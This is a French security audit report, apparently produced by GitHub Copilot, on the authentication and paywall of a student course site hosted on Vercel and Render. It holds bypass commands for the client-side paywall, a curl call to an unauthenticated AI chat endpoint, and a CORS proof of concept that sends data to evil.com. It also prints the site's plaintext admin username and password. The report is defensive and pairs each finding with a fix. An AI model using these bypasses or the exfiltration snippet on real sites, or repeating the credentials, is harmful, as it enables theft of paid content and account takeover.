# 🔒 Rapport d'Audit de Sécurité — Bachelor 1

**Date :** Juillet 2025  
**Périmètre :** Dossier `b1/` — Tous les cours et le système d'authentification  
**Auditeur :** GitHub Copilot  
**Statut global :** ⚠️ VULNÉRABILITÉS CRITIQUES DÉTECTÉES

---

## 📋 Résumé Exécutif

L'audit de sécurité du dossier `b1` révèle **3 vulnérabilités critiques**, **4 vulnérabilités moyennes** et **3 points à améliorer**. La plus grave est que la protection des contenus repose **uniquement sur du JavaScript côté client** sur la plateforme Vercel, ce qui permet un contournement trivial. Le serveur Render (server.js) offre une protection serveur correcte.

| Niveau | Nombre | Description |
|--------|--------|-------------|
| 🔴 Critique | 3 | Contournement total possible |
| 🟠 Moyen | 4 | Risques exploitables |
| 🟡 Faible | 3 | Points d'amélioration |

---

## 🏗️ Architecture de Sécurité

### Deux modes de déploiement

| Mode | Plateforme | Auth côté serveur | Auth côté client |
|------|-----------|-------------------|------------------|
| **Serveur** | Render (`server.js`) | ✅ Oui (Fastify middleware) | ✅ Oui (auth-check.js) |
| **Statique + API** | Vercel (`dist/` + `api/index.js`) | ❌ Non | ✅ Oui (auth-check.js seulement) |

### Flux d'authentification

1. L'utilisateur entre une clé XXXX-XXXX sur `/_auth/activate.html`
2. Le navigateur génère un fingerprint (canvas + WebGL + user agent, etc.)
3. `POST /api/activate` vérifie la clé en BDD PostgreSQL
4. Si valide → JWT signé stocké dans un cookie `auth_token` (HttpOnly, 365j)
5. Sur chaque page, `auth-check.js` appelle `GET /api/verify` pour vérifier le cookie
6. Si non authentifié et page protégée → overlay CSS bloquant + masquage du body

### Pages protégées vs. gratuites

| Type de page | Protégée ? | Exemple |
|-------------|-----------|---------|
| Index de cours | ❌ Gratuit | `/algo/index.html` |
| Chapitre 1 | ❌ Gratuit | `/algo/chapitres/chapitre1.html` |
| Chapitres 2+ | ✅ Protégé | `/algo/chapitres/chapitre2.html` |
| Exercices | ✅ Protégé | `/algo/exercices/*.html` |
| Assets (CSS/JS/images) | ❌ Gratuit | `/algo/assets/*` |
| Page d'accueil B1 | ❌ Gratuit | `/index.html` |

---

## 🔴 Vulnérabilités Critiques

### CRIT-01 : Contournement total de l'auth sur Vercel (client-side only)

**Gravité :** 🔴 CRITIQUE  
**CVSS estimé :** 9.1  
**Vecteur :** Désactivation JavaScript / DevTools

**Description :**  
Sur le déploiement Vercel, les fichiers HTML sont servis **statiquement** depuis `dist/`. Le build (`scripts/build.js`) injecte les scripts `auth-check.js` et `fingerprint.js` dans chaque HTML, mais il n'y a **aucun middleware serveur** qui vérifie l'authentification avant de servir le fichier.

La protection repose entièrement sur :
1. `auth-check.js` qui appelle `/api/verify` via fetch
2. La classe CSS `auth-content-hidden` qui masque le body via `visibility: hidden`
3. Un overlay DOM créé dynamiquement

**Exploit :**
```
Méthode 1 — Désactiver JavaScript :
  → Le navigateur affiche le HTML complet sans aucune protection

Méthode 2 — DevTools Console :
  → document.documentElement.classList.remove('auth-content-hidden')
  → document.getElementById('auth-blocking-overlay')?.remove()

Méthode 3 — curl / wget :
  → curl https://b1.vercel.app/algo/chapitres/chapitre5.html
  → Le HTML complet est retourné sans vérification

Méthode 4 — Extension navigateur (uBlock, NoScript) :
  → Bloquer l'exécution de auth-check.js → accès complet
```

**Impact :** Accès complet à TOUS les chapitres payants sans clé d'activation.

**Correction recommandée :**  
Migrer vers un système avec middleware serveur (Edge Functions Vercel, ou Render exclusivement). Alternativement, ne pas inclure le contenu protégé dans le HTML initial et le charger via API authentifiée.

---

### CRIT-02 : Endpoint AI Chat sans authentification

**Gravité :** 🔴 CRITIQUE  
**CVSS estimé :** 8.5  
**Fichier :** `server/routes/ai-chat.js`

**Description :**  
L'endpoint `POST /api/ai-chat` n'exige **aucune authentification**. N'importe qui peut envoyer des requêtes à l'API OpenRouter en utilisant votre clé API, ce qui engendre des **coûts financiers** non contrôlés.

**Exploit :**
```bash
curl -X POST https://votre-site.com/api/ai-chat \
  -H "Content-Type: application/json" \
  -d '{"messages":[{"role":"user","content":"Hello"}]}'
```

**Impact :**  
- Consommation de crédits OpenRouter par des utilisateurs non autorisés
- Abus potentiel (spam, contenu inapproprié) sous votre identité
- Coûts financiers non maîtrisés

**Atténuation existante :** Rate-limit de 30 req/min par IP — insuffisant.

**Correction recommandée :**  
Ajouter une vérification du cookie `auth_token` avant de traiter la requête AI :
```javascript
// Au début du handler POST /api/ai-chat :
const token = request.cookies.auth_token;
if (!token) return reply.code(401).send({ error: 'Non authentifié' });
try {
  jwt.verify(token, JWT_SECRET);
} catch {
  return reply.code(401).send({ error: 'Session invalide' });
}
```

---

### CRIT-03 : Identifiants admin faibles en clair dans .env

**Gravité :** 🔴 CRITIQUE  
**CVSS estimé :** 8.0  
**Fichier :** `.env`

**Description :**  
Les identifiants administrateur sont stockés en clair :
```
ADMIN_USERNAME=donald
ADMIN_PASSWORD=rddonald
```

Le mot de passe `rddonald` est **trivial** (8 caractères, pas de chiffres, pas de caractères spéciaux, dérivé du nom d'utilisateur). En cas de fuite ou d'accès au `.env`, l'attaquant obtient un **accès complet** au panneau d'administration.

**Risques associés :**
- Attaque par force brute (malgré le rate-limit de 5/min, un dictionnaire réussit facilement)
- Le `.env` est dans `.gitignore` ✅, mais si le repo était public ou si un backup fuite, c'est game over
- Pas de hachage du mot de passe — comparaison directe en mémoire

**Correction recommandée :**
1. Utiliser un mot de passe fort (16+ caractères, alphanumériques + spéciaux)
2. Hasher le mot de passe avec bcrypt au lieu d'une comparaison en clair
3. Ajouter une 2FA pour l'accès admin

---

## 🟠 Vulnérabilités Moyennes

### MOY-01 : Endpoint verify-fingerprint qui renvoie toujours `true`

**Gravité :** 🟠 MOYENNE  
**Fichier :** `server/routes/auth.js` (ligne 169)

**Description :**
```javascript
fastify.post('/verify-fingerprint', async (request, reply) => {
  return reply.send({ valid: true });
});
```

Cet endpoint est un **stub** qui renvoie toujours `{ valid: true }`. S'il est utilisé pour valider que le fingerprint correspond à celui enregistré, il est complètement contourné.

**Correction recommandée :** Implémenter la vérification réelle du fingerprint ou supprimer cet endpoint.

---

### MOY-02 : Regex du demo-banner incomplète — `algebre` et `ato` manquants

**Gravité :** 🟠 MOYENNE (fonctionnel + sécurité indirecte)  
**Fichier :** `public/js/auth-check.js` (ligne 129)

**Description :**
```javascript
var coursePattern = /^\/(algo|c_cpp|python|reseaux|stats|fbd|merise)\//;
```

Les cours `algebre` et `ato` ne sont **pas inclus** dans la regex de `showDemoBanner()`. Conséquences :
- Le bandeau "Mode démonstration" ne s'affiche pas sur les pages gratuites de ces cours
- Les utilisateurs ne voient pas l'incitation à acheter une clé

**Correction :**
```javascript
var coursePattern = /^\/(algo|c_cpp|python|reseaux|stats|fbd|merise|algebre|ato)\//;
```

---

### MOY-03 : JWT avec expiration de 365 jours

**Gravité :** 🟠 MOYENNE  
**Fichier :** `server/routes/auth.js`

**Description :**  
Le token JWT a une durée de vie de **365 jours**. Si un token est compromis (XSS, vol de cookie), l'attaquant a un accès prolongé sans possibilité de rotation automatique.

**Atténuation existante :** Le système de sessions en BDD permet de révoquer manuellement les sessions via le panel admin — c'est un bon point, mais insuffisant car il requiert une détection de compromission.

**Correction recommandée :**
- Réduire l'expiration JWT à 7-30 jours
- Implémenter un système de refresh token avec rotation automatique
- Ajouter une vérification du fingerprint côté serveur à chaque `/api/verify`

---

### MOY-04 : CORS `origin: true` — Toute origine acceptée

**Gravité :** 🟠 MOYENNE  
**Fichier :** `server/app.js` (ligne 19)

**Description :**
```javascript
fastify.register(require('@fastify/cors'), {
  origin: true,     // ← accepte TOUTE origine
  credentials: true
});
```

Combiné avec `credentials: true`, cela permet à n'importe quel site web de faire des requêtes authentifiées vers votre API en utilisant les cookies de l'utilisateur.

**Exploit potentiel :**
```html
<!-- Page malveillante sur evil.com -->
<script>
fetch('https://votre-site.com/api/verify', { credentials: 'include' })
  .then(r => r.json())
  .then(data => {
    // Récupère l'état d'authentification de l'utilisateur
    fetch('https://evil.com/steal?data=' + JSON.stringify(data));
  });
</script>
```

**Correction recommandée :**
```javascript
fastify.register(require('@fastify/cors'), {
  origin: ['https://votre-domaine-b1.vercel.app', 'https://votre-domaine-b1.onrender.com'],
  credentials: true
});
```

---

## 🟡 Points d'Amélioration

### FAI-01 : Pas de protection CSRF sur les endpoints POST

**Gravité :** 🟡 FAIBLE  
Le cookie `auth_token` est envoyé avec `sameSite: 'lax'`, ce qui protège contre les requêtes POST cross-origin automatiques. Cependant, le cookie `admin_token` utilise aussi `lax`, qui ne protège que les POST mais pas les GET. L'admin verify est en GET et pourrait fuiter des informations.

**Recommandation :** Ajouter un token CSRF pour les opérations admin sensibles.

---

### FAI-02 : Secrets exposés dans le code source (clé API OpenRouter)

**Gravité :** 🟡 FAIBLE (atténué par `.gitignore`)  
**Fichier :** `.env`

Le fichier `.env` contient la clé API OpenRouter (`sk-or-v1-...`) et le JWT secret. Le `.gitignore` protège ce fichier ✅, mais :
- Si le repo GitHub devenait public accidentellement, tout serait exposé
- Les variables Vercel/Render doivent être configurées via leur dashboard (vérifier qu'elles ne sont pas en mode "visible")

---

### FAI-03 : Panneau admin accessible sans restriction de réseau

**Gravité :** 🟡 FAIBLE  
**Fichier :** `public/admin/login.html`

Le formulaire de login admin (`/_auth/admin/login.html`) est accessible publiquement. Même avec le rate-limit (5 tentatives/min), un attaquant patient peut tenter une attaque par dictionnaire.

**Recommandation :**
- Restreindre l'accès admin par IP
- Ajouter un CAPTCHA après 3 échecs
- Implémenter un verrouillage temporaire du compte après N échecs

---

## ✅ Points Positifs

| Point | Détail |
|-------|--------|
| ✅ Cookies HttpOnly | Le cookie `auth_token` n'est pas accessible via JavaScript |
| ✅ Cookie Secure en production | `secure: IS_PROD` active le flag Secure en production |
| ✅ Rate Limiting | 100 req/min global, 5/min sur activation et login admin |
| ✅ Helmet activé | En-têtes de sécurité (sauf CSP désactivé) |
| ✅ Fingerprint hashé | Le fingerprint machine est hashé avec SHA-256 avant stockage |
| ✅ Validation de clé XXXX-XXXX | Regex stricte sur le format de clé côté serveur |
| ✅ .env dans .gitignore | Les secrets ne sont pas committes dans le repo |
| ✅ Blocage chemins sensibles | `BLOCKED_PATHS` empêche l'accès à `/server/`, `/.env`, etc. (Render) |
| ✅ Protection serveur sur Render | `server.js` vérifie l'auth côté serveur avant de servir les fichiers HTML |
| ✅ Sessions révocables | Le panel admin permet de révoquer clés et sessions individuellement |
| ✅ Logs d'activité | Toutes les actions (activation, login admin, révocations) sont loguées en BDD |
| ✅ Path traversal protégé | Vérification `resolved.startsWith()` pour éviter les traversées de répertoire |

---

## 📊 Matrice de Risque par Plateforme

### Render (server.js) — Protection CORRECTE

```
Requête HTTP → Fastify → BLOCKED_PATHS check → isProtected() →
  → verifyUserAuth() (vérifie JWT + BDD) →
    → Si OK : sert le fichier HTML (avec auth-check.js injecté)
    → Si KO : redirige vers /_auth/activate.html
```

**Verdict : ✅ Les contenus sont protégés côté serveur. Un attaquant ne peut pas obtenir le HTML sans un cookie valide.**

### Vercel (dist/ statique) — Protection INSUFFISANTE

```
Requête HTTP → CDN Vercel → Sert le fichier HTML directement (AUCUNE vérification)
  → Le navigateur exécute auth-check.js →
    → fetch(/api/verify) → Si non authentifié → overlay CSS
    → MAIS le HTML est déjà dans le DOM !
```

**Verdict : 🔴 Les contenus sont accessibles sans clé. La protection est purement cosmétique (CSS/JS).**

---

## 🔧 Plan de Correction Prioritaire

### Priorité 1 — Immédiat (< 24h)

| # | Action | Fichier(s) |
|---|--------|-----------|
| 1 | **Changer le mot de passe admin** vers un password fort | `.env` |
| 2 | **Ajouter l'auth au endpoint AI Chat** | `server/routes/ai-chat.js` |
| 3 | **Corriger la regex showDemoBanner** pour inclure `algebre` et `ato` | `public/js/auth-check.js` |

### Priorité 2 — Court terme (< 1 semaine)

| # | Action | Fichier(s) |
|---|--------|-----------|
| 4 | **Restreindre CORS** à vos domaines de production | `server/app.js` |
| 5 | **Implémenter ou supprimer verify-fingerprint** | `server/routes/auth.js` |
| 6 | **Réduire l'expiration JWT** à 30 jours + refresh token | `server/routes/auth.js` |

### Priorité 3 — Moyen terme (< 1 mois)

| # | Action | Fichier(s) |
|---|--------|-----------|
| 7 | **Résoudre la vulnérabilité Vercel** — Option A : Edge Middleware Vercel pour vérifier le JWT avant de servir les fichiers. Option B : Ne servir que les pages gratuites en statique, charger le contenu payant via API. Option C : Rester exclusivement sur Render. | `vercel.json`, nouveau middleware |
| 8 | **Activer Content Security Policy (CSP)** | `server/app.js` |
| 9 | **Ajouter brute-force protection** sur le login admin (lockout + CAPTCHA) | `server/routes/admin.js` |
| 10 | **Hasher le mot de passe admin** avec bcrypt au lieu de comparaison en clair | `server/routes/admin.js` |

---

## 📝 Conclusion

Le système d'authentification B1 est **bien conçu architecturalement** avec des pratiques solides (JWT, sessions BDD, fingerprinting, rate-limiting, cookies HttpOnly). Cependant, son talon d'Achille réside dans le **déploiement Vercel statique** qui rend la protection côté client triviale à contourner.

**Recommandation principale :** Si Vercel est votre plateforme de production, il est **impératif** d'ajouter un middleware Edge ou de migrer la logique de protection côté serveur. En l'état, **100% des contenus payants sont accessibles sans clé sur Vercel**.

Sur Render, la protection est **correcte et fonctionnelle** — le serveur vérifie l'authentification avant de servir les fichiers HTML protégés.

---

*Rapport généré le 2025-07 — Audit de sécurité B1 v1.0*
